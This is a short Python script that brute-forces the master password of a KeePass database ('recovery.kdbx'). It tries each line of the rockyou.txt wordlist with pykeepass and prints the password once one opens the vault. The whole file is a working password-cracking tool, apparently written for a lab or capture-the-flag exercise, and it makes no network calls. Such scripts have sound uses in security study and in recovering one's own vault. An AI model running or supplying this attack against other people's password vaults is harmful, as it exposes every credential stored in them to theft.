from pykeepass import PyKeePass

## TODO add parameters for wordlist and archive file

print("[*] Opening wordlist")
try:
    with open('/usr/share/wordlists/rockyou.txt', 'r', encoding='unicode_escape') as file:
        print("[*] Starting bruteforce process")
        for line in file:
            passwordValue=line.strip()
            try:
                # load database
                kp = PyKeePass('recovery.kdbx', password=passwordValue)
                print(f"[!] Success! Vault password: {passwordValue}")
                print("[*] Stopping bf process")
                break
            except:
                continue
    print("[*] Done.")
except FileNotFoundError:
    print("[ERROR]: The file wordlist was not found.")
except Exception as e:
    print(f"[ERROR]: An error occurred while attempting to load wordlist: {e}")
